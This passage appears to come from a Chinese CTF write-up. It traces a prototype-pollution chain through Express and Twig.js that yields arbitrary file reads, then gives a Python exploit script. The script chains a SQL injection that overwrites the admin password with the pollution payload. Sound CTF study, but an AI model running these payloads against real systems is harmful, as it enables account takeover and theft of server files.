class="hljs-string">&quot;&lt;script&gt;alert(&#x27;Error!&#x27;);window.location.href=&#x27;/admin&#x27;&lt;/script&gt;&quot;</span>);<br>    &#125;<br>  &#125;<br>&#125;)<br></code></pre></td></tr></table></figure><p>定位到<code>utils.extend</code>在<code>utils.js</code>中查看源码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">static</span> <span class="hljs-title function_">extend</span>(<span class="hljs-params">target</span>) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">1</span>; i &lt; <span class="hljs-variable language_">arguments</span>.<span class="hljs-property">length</span>; i++) &#123;<br>            <span class="hljs-keyword">var</span> source = <span class="hljs-variable language_">arguments</span>[i]<br>            <br>            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> key <span class="hljs-keyword">in</span> source) &#123;<br>                <span class="hljs-keyword">if</span> (key === <span class="hljs-string">&#x27;__proto__&#x27;</span>) &#123;<br>                    <span class="hljs-keyword">return</span>;<br>                &#125;<br>                <span class="hljs-keyword">if</span> (hasOwnProperty.<span class="hljs-title function_">call</span>(source, key)) &#123;<br>                    <span class="hljs-keyword">if</span> (key <span class="hljs-keyword">in</span> source &amp;&amp; key <span class="hljs-keyword">in</span> target) &#123;<br>                        <span class="hljs-title class_">Utils</span>.<span class="hljs-title function_">extend</span>(target[key], source[key])<br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        target[key] = source[key]<br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> target<br>    &#125;<br></code></pre></td></tr></table></figure><p>很典型的递归调用合并函数。至此可以判断下一步的利用点是原型链污染。</p><p>同时可以看到在<code>__proto__</code>属性被过滤了，这里使用<code>constructor.prototype</code>进行绕过。</p><p>现在把重点放在<code>entxend</code>函数后面的<code>render</code>函数里面。设置debug进行逐行审计。</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xl"><span class="hljs-function"><span class="hljs-title">utils</span>.js-&gt;</span>render()<br><span class="hljs-function"><span class="hljs-title">response</span>.js-&gt;</span>app.render()<br><span class="hljs-function"><span class="hljs-title">application</span>-&gt;</span>view.render()<br><span class="hljs-function"><span class="hljs-title">twig</span>.js-&gt;</span>Twig.exports.twig()<br><span class="hljs-function"><span class="hljs-title">twig</span>.js-&gt;</span>Twig.Templates.loadRemote()<br><span class="hljs-function"><span class="hljs-title">twig</span>.js-&gt;</span>Twig.Templates.loadRemote()<br></code></pre></td></tr></table></figure><p>首先是进入response.js里的res.render()函数,这里的操作就是对一些数据进行了赋值。</p><p>接着进入到了application.js里的app.render()里，也是对一些数据进行了赋值。</p><p>接着进入到了application.js里的this.set(path)</p><p>在view.js里设置了fileName值为变量name的值，即<code>admin</code></p><p>接着在这里</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">this</span>.<span class="hljs-property">ext</span>) &#123;<br>   <span class="hljs-comment">// get extension from default engine name</span><br>   <span class="hljs-variable language_">this</span>.<span class="hljs-property">ext</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">defaultEngine</span>[<span class="hljs-number">0</span>] !== <span class="hljs-string">&#x27;.&#x27;</span><br>     ? <span class="hljs-string">&#x27;.&#x27;</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">defaultEngine</span><br>     : <span class="hljs-variable language_">this</span>.<span class="hljs-property">defaultEngine</span>;<br><br>   fileName += <span class="hljs-variable language_">this</span>.<span class="hljs-property">ext</span>;<br> &#125;<br></code></pre></td></tr></table></figure><p>fileName被设置为了<code>admin.twig</code></p><p>接着还是在view.js里会调用lookup方法，根据文件名<code>admin.twig</code>查找并设置<code>path</code>值</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// lookup path</span><br><span class="hljs-variable language_">this</span>.<span class="hljs-property">path</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">lookup</span>(fileName);<br></code></pre></td></tr></table></figure><p>然后又跳到了application.js里的view.render()里面</p><p>接着到twig.js里的<code>Twig.exports.renderFile()</code>，然后是Twig.exports.twig(params),这里的作用是加载渲染twig模板并输出。</p><p>进入<code>Twig.exports.renderFile()</code>后显示对params的各个参数进行判断</p><p>由于在上面我们知道了path值已经被设置为了<code>admin.twig</code>所以这里会进入判断，同时要注意这里传入的params对象已经没有了path属性。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">if</span> (params.<span class="hljs-property">path</span> !== <span class="hljs-literal">undefined</span>) &#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-title class_">Twig</span>.<span class="hljs-property">Templates</span>.<span class="hljs-title function_">loadRemote</span>(params.<span class="hljs-property">path</span>, &#123;<br>        <span class="hljs-attr">id</span>: id,<br>        <span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;fs&#x27;</span>,<br>        <span class="hljs-attr">parser</span>: params.<span class="hljs-property">parser</span> || <span class="hljs-string">&#x27;twig&#x27;</span>,<br>        <span class="hljs-attr">base</span>: params.<span class="hljs-property">base</span>,<br>        <span class="hljs-attr">module</span>: params.<span class="hljs-property">module</span>,<br>        <span class="hljs-attr">precompiled</span>: params.<span class="hljs-property">precompiled</span>,<br>        <span class="hljs-attr">async</span>: params.<span class="hljs-property">async</span>,<br>        <span class="hljs-attr">options</span>: options<br>      &#125;, params.<span class="hljs-property">load</span>, params.<span class="hljs-property">error</span>);<br>    &#125;<br>  &#125;; <span class="hljs-comment">// Extend Twig with a new filter.</span><br></code></pre></td></tr></table></figure><p>接着是<code>loadRemote</code>函数</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title class_">Twig</span>.<span class="hljs-property">Templates</span>.<span class="hljs-property">loadRemote</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">location, params, callback, errorCallback</span>) &#123;<br>    <span class="hljs-comment">// Default to the URL so the template is cached.</span><br>    <span class="hljs-keyword">var</span> id = <span class="hljs-keyword">typeof</span> params.<span class="hljs-property">id</span> === <span class="hljs-string">&#x27;undefined&#x27;</span> ? location : params.<span class="hljs-property">id</span>;<br>    <span class="hljs-keyword">var</span> cached = <span class="hljs-title class_">Twig</span>.<span class="hljs-property">Templates</span>.<span class="hljs-property">registry</span>[id]; <span class="hljs-comment">// Check for existing template</span><br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title class_">Twig</span>.<span class="hljs-property">cache</span> &amp;&amp; <span class="hljs-keyword">typeof</span> cached !== <span class="hljs-string">&#x27;undefined&#x27;</span>) &#123;<br>      <span class="hljs-comment">// A template is already saved with the given id.</span><br>      <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> callback === <span class="hljs-string">&#x27;function&#x27;</span>) &#123;<br>        <span class="hljs-title function_">callback</span>(cached);<br>      &#125; <span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> if async, return deferred promise</span><br><br><br>      <span class="hljs-keyword">return</span> cached;<br>    &#125; <span class="hljs-comment">// If the parser name hasn&#x27;t been set, default it to twig</span><br><br><br>    params.<span class="hljs-property">parser</span> = params.<span class="hljs-property">parser</span> || <span class="hljs-string">&#x27;twig&#x27;</span>;<br>    params.<span class="hljs-property">id</span> = id; <span class="hljs-comment">// Default to async</span><br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> params.<span class="hljs-property">async</span> === <span class="hljs-string">&#x27;undefined&#x27;</span>) &#123;<br>      params.<span class="hljs-property">async</span> = <span class="hljs-literal">true</span>;<br>    &#125; <span class="hljs-comment">// Assume &#x27;fs&#x27; if the loader is not defined</span><br><br><br>    <span class="hljs-keyword">var</span> loader = <span class="hljs-variable language_">this</span>.<span class="hljs-property">loaders</span>[params.<span class="hljs-property">method</span>] || <span class="hljs-variable language_">this</span>.<span class="hljs-property">loaders</span>.<span class="hljs-property">fs</span>;<br>    <span class="hljs-keyword">return</span> loader.<span class="hljs-title function_">call</span>(<span class="hljs-variable language_">this</span>, location, params, callback, errorCallback);<br>  &#125;; <span class="hljs-comment">// Determine object type</span><br></code></pre></td></tr></table></figure><p>这边是通过params的id来加载模版。location变量正好是上面传入的<code>params.path</code>，且params.id为非空，所以这里是通过<code>params.id</code>来加载模板。而在上面的代码中，id的值也正好是path的值。</p><p><img src="/img/2023ciscn/1.png"></p><p>接着会通过call函数会调用到<code>registerLoader</code>函数</p><p><code>registerLoader</code>函数我们可以关注下面这一条</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">if</span> (precompiled === <span class="hljs-literal">true</span>) &#123;<br>        data = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(data);<br>      &#125;<br><br>      params.<span class="hljs-property">data</span> = data;<br>      params.<span class="hljs-property">path</span> = params.<span class="hljs-property">path</span> || location; <span class="hljs-comment">// Template is in data</span><br><br></code></pre></td></tr></table></figure><p>因为在之前params的path属性已经被销毁，这里默认是location的路径。所以这里可以推测出一条利用链，通过原型链污染来控制path属性从而读取任意文件。</p><p>所以原型链可以按如下格式进行构造</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;constructor&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;protoytpe&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;path&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;flag路径&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>根据上面的分析可以编写以下脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs python">![<span class="hljs-number">2</span>](images/<span class="hljs-number">2.</span>png)<span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> hashlib <span class="hljs-keyword">as</span> md5<br><span class="hljs-keyword">import</span> json<br><br>s=requests.session()<br>url=<span class="hljs-string">&quot;http://127.0.0.1&quot;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">SQLinjection</span>(<span class="hljs-params">url</span>):<br>    url=<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;url&#125;</span>/register&#x27;</span><br>    passwd=<span class="hljs-string">&#x27;123456&#x27;</span><br>    <span class="hljs-built_in">hash</span>=passwd.encode(<span class="hljs-string">&#x27;UTF-8&#x27;</span>)<br>    data=&#123;<br>        <span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">f&quot;admin&#x27;,&#x27;<span class="hljs-subst">&#123;md5.md5(<span class="hljs-built_in">hash</span>).hexdigest()&#125;</span>&#x27;) on CONFLICT DO UPDATE SET password=&#x27;<span class="hljs-subst">&#123;md5.md5(<span class="hljs-built_in">hash</span>).hexdigest()&#125;</span>&#x27; --+&quot;</span>,<br>        <span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;123456&quot;</span><br>    &#125;<br>    res=s.post(url=url,data=data)<br>    <span class="hljs-keyword">if</span> res.status_code == <span class="hljs-number">200</span> :<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;injected successfully!\n&quot;</span>,res.content)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;injected failed&quot;</span>)<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    url=<span class="hljs-string">&quot;http://127.0.0.1:80&quot;</span><br>    SQLinjection(url)<br><br><span class="hljs-comment">#忘记写登录的逻辑了</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Login</span>(<span class="hljs-params">url</span>):<span class="hljs-comment">#获取登录session</span><br>    url=<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;url&#125;</span>/login&#x27;</span><br>    data=&#123;<br>        <span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span>,<br>        <span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;123456&quot;</span><br>    &#125;<br>    res=s.post(url=url,data=data)<br>    <span class="hljs-keyword">if</span> res.status_code == <span class="hljs-number">200</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Login successful&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Login failed&quot;</span>)<br><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pollution</span>(<span class="hljs-params">url</span>):<br>    url=<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;url&#125;</span>/admin&#x27;</span><br>    data=&#123;<span class="hljs-string">&quot;constructor&quot;</span>:&#123;<span class="hljs-string">&quot;prototype&quot;</span>:&#123;<span class="hljs-string">&quot;path&quot;</span>:<span class="hljs-string">&quot;/Users/sammy/Desktop/临时题目文件夹/pollute/flag.txt&quot;</span>&#125;&#125;<br>    &#125;<br>    data=json.dumps(data)<br>    res=s.post(url=url,data=data,headers=&#123;<span class="hljs-string">&quot;Content-Type&quot;</span>:<span class="hljs-string">&quot;application/json&quot;</span>&#125;)<br>    <span class="hljs-keyword">if</span> res.status_code == <span class="hljs-number">200</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;polluted successfully\n&quot;</span>,res.content)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;polluted failed\n&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    SQLinjection(url)<br>    Login(url)<br>    pollution(url)<br></code></pre></td></tr></table></figure><p>获得flag</p><p><img src="/img/2023ciscn/2.png"></p><p>参考文章：kento师傅的复现wp</p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
